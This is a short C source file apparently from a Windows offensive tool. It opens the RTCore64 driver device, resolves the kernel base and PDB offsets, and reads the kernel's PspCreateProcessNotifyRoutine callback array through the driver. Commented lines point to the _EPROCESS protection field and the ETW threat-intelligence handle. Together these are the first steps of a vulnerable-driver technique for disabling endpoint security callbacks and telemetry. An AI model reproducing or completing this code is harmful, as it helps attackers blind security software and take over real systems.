
#include "utils.h"






int main() {

	HANDLE hDevice = CreateFile(
		L"\\\\.\\RTCore64",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	ULONG_PTR ntoskrnlBase = GetKernelBaseAddress();
	
	printf("Kernel base: %p\n", ntoskrnlBase);

    EZPDB pdb = loadKernelOffsets();

	//    ULONG protectionOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Protection");

	//ULONG etWThreatIntProvRegHandleoff = EzPdbGetRva(&pdb, "EtwThreatIntProvRegHandle");

	DWORD64  pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");


	DWORD64 address = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;

	printf("pspCreateProcessNotifyRoutineArray address: %llx\n", address);
	DWORD64 readPspAddr = Read64(hDevice, address);

	printf("PspCreateProcessNotifyRoutine: %llx", readPspAddr);

}